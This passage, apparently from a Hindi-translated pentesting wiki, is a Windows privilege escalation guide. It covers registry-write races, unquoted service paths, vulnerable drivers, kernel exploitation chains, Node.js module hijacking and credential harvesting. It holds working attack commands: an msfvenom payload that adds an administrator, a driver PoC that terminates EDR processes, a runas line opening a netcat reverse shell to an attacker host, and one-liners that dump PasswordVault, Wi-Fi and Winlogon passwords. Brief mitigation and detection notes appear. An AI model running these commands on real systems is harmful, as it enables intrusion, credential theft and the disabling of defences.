1. वह **HKCU ATConfig** value भरें जिसे आप SYSTEM द्वारा लिखवाना चाहते हैं।
2. secure-desktop copy trigger करें (जैसे **LockWorkstation**), जिससे AT broker flow शुरू होता है।
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; जब oplock fire हो, तो **HKLM Session ATConfig** key को एक **registry link** से protected HKLM target पर replace करें।
4. SYSTEM attacker-chosen value को redirected HKLM path पर लिखता है।

जब आपके पास arbitrary HKLM value write हो, तो service configuration values overwrite करके LPE करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसी service चुनें जिसे normal user start कर सके (जैसे **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में workstation को **locks** करता है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका अर्थ है कि **आप इससे sub registries create कर सकते हैं**। Windows services के मामले में यह **arbitrary code execute करने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows space से पहले समाप्त होने वाले प्रत्येक path को execute करने का प्रयास करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को execute करने का प्रयास करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths की सूची बनाएँ, built-in Windows services से संबंधित paths को छोड़कर:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability को metasploit से detect और exploit कर सकते हैं:** `exploit/windows/local/trusted\_service\_path` आप metasploit से manually एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows उपयोगकर्ताओं को service fail होने पर की जाने वाली actions निर्दिष्ट करने की अनुमति देता है। इस feature को किसी binary की ओर point करने के लिए configure किया जा सकता है। यदि इस binary को replace किया जा सकता है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Applications

### Installed Applications

**binaries की permissions** जांचें (शायद आप किसी binary को overwrite करके privileges escalate कर सकें) और folders की भी ([DLL Hijacking](dll-hijacking/index.html))।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जांचें कि क्या आप किसी config file को modify करके किसी special file को read कर सकते हैं या किसी ऐसे binary को modify कर सकते हैं जिसे Administrator account द्वारा execute किया जाना है (schedtasks)।

System में weak folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders में मौजूद किसी भी plugin DLL को autoload करता है। यदि कोई writable portable/copy install मौजूद है, तो malicious plugin डालने से हर launch पर `notepad++.exe` के अंदर automatic code execution प्राप्त किया जा सकता है (जिसमें `DllMain` और plugin callbacks से होने वाला execution भी शामिल है)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Startup पर run करना

**जांचें कि क्या आप ऐसी registry या binary को overwrite कर सकते हैं जिसे कोई दूसरा user execute करने वाला है।**\
**निम्नलिखित page को पढ़ें** ताकि privileges escalate करने के लिए उपयोगी **autoruns locations** के बारे में अधिक जानकारी मिल सके:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party अजीब/vulnerable** drivers खोजें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver arbitrary kernel read/write primitive expose करता है (खराब तरीके से design किए गए IOCTL handlers में सामान्य), तो आप kernel memory से सीधे SYSTEM token चुराकर privilege escalate कर सकते हैं। step-by-step technique यहां देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Race-condition bugs के मामले में, जहां vulnerable call attacker-controlled Object Manager path खोलती है, lookup को जानबूझकर धीमा करना (max-length components या deep directory chains का उपयोग करके) window को microseconds से बढ़ाकर tens of microseconds तक कर सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, और I/O ring pivots

कुछ Windows kernel LPE chains दो individually weak bugs से बनाए जा सकते हैं: एक **cancel-safe queue lifetime race**, जो queue lock के अभी held होने के दौरान request/CBD को free कर देती है, और एक **lock-release-before-copy** disclosure, जो `RtlCopyToUser` के दौरान freed paged-pool allocation को leak करती है।

Audit और exploitation notes:

- **Free-under-lock + cancel afterwards**: ऐसे success path को खोजें जो **Acquire -> CompleteRequest/free -> Release** करता हो, जबकि cancel path **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** करता हो। यदि success path CBDQ/CSQ lock release करने से पहले `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` तक पहुंचता है, तो `NtCancelIoFileEx -> IopCsqCancelRoutine` में blocked thread बाद में resume होकर freed `PFLT_CALLBACK_DATA` को driver के remove callback में वापस भेज सकता है।
- **Freed queue object को** same-sized, attacker-controlled paged-pool allocation से **reclaim करें**। `NPFS` Data Queue Entries उपयोगी हैं क्योंकि payload और size controllable होते हैं और बाद में pipe read/peek operations से उन्हें probe किया जा सकता है। यदि freed object list links embed करता है, तो उन्हें user memory में मौजूद **cyclic list of fake request nodes** से overwrite करें, ताकि driver original list head पर terminate होने के बजाय attacker-defined request structures को बार-बार process करे।
- **Predictable write को upgrade करें**: यदि fake request bookkeeping writes (timestamps / QPC / refcount-adjacent fields) द्वारा उपयोग किए जाने वाले nested context pointer को redirect करती है, तो आपको **address-controlled but not value-controlled** kernel write मिल सकती है। ऐसी स्थिति में final code/data pointer के बजाय sprayed pool object के **length/size** field को target करें, फिर spray को enumerate करें जब तक corrupted object **out-of-bounds paged-pool read** न कर दे।
- **Raceable disclosure pattern**: कोई भी syscall जो `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` करता है, एक strong candidate है। Reliability तब बेहतर होती है जब attacker copied buffer को बड़ा कर सके (उदाहरण के लिए serializer के final allocation size को बढ़ाने वाली कई list/resource entries जोड़कर), क्योंकि लंबी copy replacement window को बढ़ाती है और जरूरी नहीं कि machine crash हो।
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays उत्कृष्ट disclosure targets हैं क्योंकि उनका paged-pool size attacker-controlled है (`8 * regBufferCnt`) और प्रत्येक element `_IOP_MC_BUFFER_ENTRY` का kernel pointer है। इनमें से किसी एक array को leak करें, आसपास का `IORING_OBJECT` recover करें, फिर **`RegBuffers`** और **`RegBuffersCount`** को corrupt करें ताकि subsequent I/O ring operations attacker-forged entries consume करें और arbitrary kernel read/write प्रदान करें। यदि उपलब्ध एकमात्र write आपको कोई stable byte देती है (उदाहरण के लिए `KUSER_SHARED_DATA+0x14` से), तो **overlapping unaligned writes** का उपयोग करके `0x0101010101010101` जैसे repeated-byte user pointer को बनाएं, उसे `VirtualAlloc` से map करें, और forged registered-buffer array वहां रखें।

Useful debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
एक बार corrupted I/O ring से arbitrary kernel read/write प्राप्त कर लेने के बाद, standard post-primitive workflow का उपयोग करके SYSTEM token चुरा लें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities आपको deterministic layouts को groom करने, writable HKLM/HKU descendants का दुरुपयोग करने और custom driver के बिना metadata corruption को kernel paged-pool overflows में बदलने देती हैं। पूरी chain यहां सीखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

कुछ drivers userland से registry path स्वीकार करते हैं, केवल यह validate करते हैं कि वह एक मान्य UTF-16 string है, और फिर `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` को `RTL_QUERY_REGISTRY_DIRECT` के साथ stack scalar जैसे `int readValue` में call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` मौजूद नहीं है, तो `EntryContext` की व्याख्या developer द्वारा अपेक्षित type के अनुसार नहीं, बल्कि **actual** registry type के अनुसार की जाती है।

इससे दो उपयोगी primitives बनते हैं:

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path driver को attacker-chosen keys query करने देता है, return codes/logs के माध्यम से उनके अस्तित्व का leak करता है, और कभी-कभी उन values को पढ़ने देता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination registry value type के आधार पर type-confused होकर `REG_QWORD`, `UNICODE_STRING`, या sized binary buffer बन जाता है।

Practical exploitation notes:

- **Windows 8+ mitigation**: यदि query **untrusted hive** तक पहुंचती है और `RTL_QUERY_REGISTRY_DIRECT` का उपयोग `RTL_QUERY_REGISTRY_TYPECHECK` के बिना किया जाता है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash हो जाते हैं। Exploitability बनाए रखने के लिए values को `HKCU` के अंतर्गत stage करने के बजाय **trusted system hives** के अंदर attacker-writable keys खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, और sandboxed contexts से reachable keys खोजने के लिए duplicated **low-integrity** token के साथ scan दोबारा चलाएं:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte `int` में 8-byte direct write adjacent stack data को corrupt करता है और पास के callback/function pointer को आंशिक रूप से overwrite कर सकता है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का किसी `UNICODE_STRING` की ओर point करना अपेक्षित है। यदि code पहले attacker-controlled `REG_DWORD` को stack scalar में लोड करता है और फिर उसी buffer को string read के लिए दोबारा उपयोग करता है, तो attacker `Length`/`MaximumLength` को नियंत्रित करता है और `Buffer` pointer को आंशिक रूप से प्रभावित करता है, जिससे semi-controlled kernel write प्राप्त होती है।
- **`REG_BINARY`**: बड़े binary data के लिए direct mode, `EntryContext` पर पहले `LONG` को signed buffer size मानता है। यदि पिछला `REG_DWORD` read reused scalar में attacker-controlled **negative** value छोड़ देता है, तो अगला `REG_BINARY` query attacker bytes को सीधे adjacent stack slots पर कॉपी करता है, जो अक्सर callback-pointer को पूरी तरह overwrite करने का सबसे साफ रास्ता होता है।

Strong hunting pattern: **एक ही stack variable में heterogeneous registry reads, उसे reinitialize किए बिना**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, और ऐसे code paths को grep करें जहाँ पहला registry read यह नियंत्रित करता है कि दूसरा read होगा या नहीं।

#### device objects पर missing FILE_DEVICE_SECURE_OPEN का दुरुपयोग (LPE + EDR kill)

कुछ signed third-party drivers `IoCreateDeviceSecure` के माध्यम से strong SDDL के साथ अपना device object बनाते हैं, लेकिन `DeviceCharacteristics` में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, जब device को extra component वाले path के माध्यम से खोला जाता है, तब secure DACL लागू नहीं होता, जिससे कोई भी unprivileged user namespace path का उपयोग करके handle प्राप्त कर सकता है, जैसे:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक real-world case से)

जब कोई user device खोल सकता है, तो driver द्वारा exposed privileged IOCTLs का LPE और tampering के लिए दुरुपयोग किया जा सकता है। Wild में देखी गई example capabilities:
- Arbitrary processes के लिए full-access handles लौटाना (token theft / `DuplicateTokenEx`/`CreateProcessAsUser` के माध्यम से SYSTEM shell)।
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks)।
- Arbitrary processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे kernel के माध्यम से user land से AV/EDR kill किया जा सकता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Developers के लिए Mitigations
- DACL द्वारा restricted किए जाने वाले device objects बनाते समय हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- Privileged operations के लिए caller context को validate करें। Process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को constrain करें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Defenders के लिए Detection ideas
- Suspicious device names (जैसे \\ .\\amsdk*) के user-mode opens और abuse का संकेत देने वाले specific IOCTL sequences को monitor करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

यदि आपके पास **PATH पर मौजूद किसी folder के अंदर write permissions** हैं, तो आप किसी process द्वारा load की जाने वाली DLL को hijack करके **privileges escalate** कर सकते हैं।

PATH के अंदर मौजूद सभी folders की permissions check करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस check का abuse करने के तरीके के बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` के माध्यम से Node.js / Electron module resolution hijacking

यह **Windows uncontrolled search path** variant है, जो **Node.js** और **Electron** applications को प्रभावित करता है, जब वे `require("foo")` जैसे bare import का उपयोग करते हैं और अपेक्षित module **missing** होता है।

Node packages को directory tree में ऊपर की ओर जाकर और प्रत्येक parent में `node_modules` folders को check करके resolve करता है। Windows पर यह प्रक्रिया drive root तक पहुंच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch की गई application निम्न paths को probe कर सकती है:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

यदि कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) plant कर सकता है और **higher-privileged Node/Electron process** द्वारा missing dependency के resolve होने की प्रतीक्षा कर सकता है। Payload victim process के security context में execute होता है, इसलिए जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app के रूप में चलता है, तो यह **LPE** बन जाता है।

यह विशेष रूप से इन स्थितियों में common है:

- कोई dependency `optionalDependencies` में declared हो
- कोई third-party library `require("foo")` को `try/catch` में wrap करके failure पर आगे जारी रखती हो
- कोई package production builds से remove किया गया हो, packaging के दौरान omit हो गया हो, या install होने में fail हुआ हो
- vulnerable `require()` main application code में होने के बजाय dependency tree के अंदर गहराई में मौजूद हो

### Vulnerable targets की hunting

Resolution path को prove करने के लिए **Procmon** का उपयोग करें:

- `Process Name` = target executable (`node.exe`, Electron app EXE, या wrapper process) द्वारा filter करें
- `Path` `contains` `node_modules` द्वारा filter करें
- `NAME NOT FOUND` और `C:\node_modules` के अंतर्गत अंतिम successful open पर focus करें

Unpacked `.asar` files या application sources में उपयोगी code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon या source review से **missing package name** की पहचान करें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएं:
```powershell
mkdir C:\node_modules
```
3. बिल्कुल अपेक्षित नाम वाला एक module रखें:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Victim application को trigger करें। यदि application `require("foo")` का प्रयास करता है और legitimate module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस pattern में फिट होने वाले missing optional modules के real-world examples में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** ही reusable हिस्सा है: कोई भी **missing bare import** खोजें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening के विचार

- जब कोई user `C:\node_modules` बनाता है या वहां नई `.js` files/packages लिखता है, तो alert करें।
- ऐसे high-integrity processes के लिए hunt करें जो `C:\node_modules\*` से पढ़ रहे हों।
- Production में सभी runtime dependencies को package करें और `optionalDependencies` के उपयोग का audit करें।
- Third-party code में silent `try { require("...") } catch {}` patterns की समीक्षा करें।
- जब library इसका support करती हो, तो optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments `WS_NO_UTF_8_VALIDATE=1` के साथ legacy `utf-8-validate` probe से बच सकते हैं)।

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहर से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Firewall से संबंधित commands के लिए यह page देखें**](../basic-cmd-for-pentesters.md#firewall) **(rules list करना, rules create करना, turn off करना, turn off करना...)**

[Network enumeration के लिए और commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

यदि आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का उपयोग करेंगे, तो GUI के माध्यम से पूछा जाएगा कि क्या `nc` को firewall द्वारा अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `WSL` filesystem को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में explore कर सकते हैं।

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) से\
Windows Vault उन servers, websites और अन्य programs के लिए user credentials store करता है, जिनमें **Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सक**ता है। पहली नज़र में ऐसा लग सकता है कि अब users अपने Facebook credentials, Twitter credentials, Gmail credentials आदि store कर सकते हैं, ताकि वे browsers के माध्यम से automatically log in हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन credentials को store करता है जिनके माध्यम से Windows users को automatically log in कर सकता है। इसका अर्थ है कि कोई भी **Windows application जिसे किसी resource तक पहुँचने के लिए credentials की आवश्यकता होती है** (server या website), **इस Credential Manager** और Windows Vault का उपयोग कर सकता है और users द्वारा हर बार username और password दर्ज करने के बजाय दिए गए credentials का उपयोग कर सकता है।

जब तक applications Credential Manager के साथ interact नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए resource के credentials का उपयोग कर सकते हैं। इसलिए, यदि आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह **credential manager के साथ communicate करना चाहिए और उस resource के credentials का अनुरोध करना चाहिए** default storage vault से।

Machine पर stored credentials की list देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `/savecred` options के साथ `runas` का उपयोग कर सकते हैं। निम्नलिखित उदाहरण SMB share के माध्यम से किसी remote binary को call करता है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
दिए गए credentials के सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से भी ऐसा किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services authentication tokens तथा plaintext passwords को Universal Windows Platform (UWP) `PasswordVault` में store करते हैं (जिसे `vaultcmd` में `Web Credentials` के रूप में भी expose किया जाता है)। यह storage space session-isolated होता है और इसे administrative या `SeDebugPrivilege` rights के बिना native रूप से decrypt किया जा सकता है।

सभी stored usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए user's active session के अंदर यह PowerShell command execute करें:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक विधि प्रदान करता है, जिसका उपयोग मुख्य रूप से Windows operating system में asymmetric private keys के symmetric encryption के लिए किया जाता है। इस encryption में entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग किया जाता है।

**DPAPI उन keys को symmetric key के माध्यम से encrypt करता है, जो user के login secrets से derived होती है**। System encryption से जुड़े मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में stored होती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, जो उसी file में user की private keys को सुरक्षित रखने वाली master key के साथ co-located होती है**, आमतौर पर 64 bytes के random data से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस directory तक access restricted होता है, इसलिए CMD में `dir` command के माध्यम से इसकी contents की listing नहीं की जा सकती, हालांकि इसे PowerShell के माध्यम से list किया जा सकता है।)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे decrypt कर सकते हैं।

**master password द्वारा protected credentials files** आमतौर पर यहां स्थित होती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` को उचित `/masterkey` के साथ decrypt करने के लिए उपयोग कर सकते हैं।\
यदि आप root हैं, तो `sekurlsa::dpapi` module से **memory** से कई **DPAPI** **masterkeys** **extract** कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation tasks के लिए encrypted credentials को सुविधाजनक रूप से store करने के तरीके के रूप में किया जाता है। Credentials को **DPAPI** का उपयोग करके protected किया जाता है, जिसका सामान्यतः अर्थ है कि उन्हें केवल उसी user द्वारा, उसी computer पर decrypt किया जा सकता है जिस पर वे बनाए गए थे।

जिस file में PS credentials हैं, उससे उन्हें **decrypt** करने के लिए आप यह कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाई-फाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
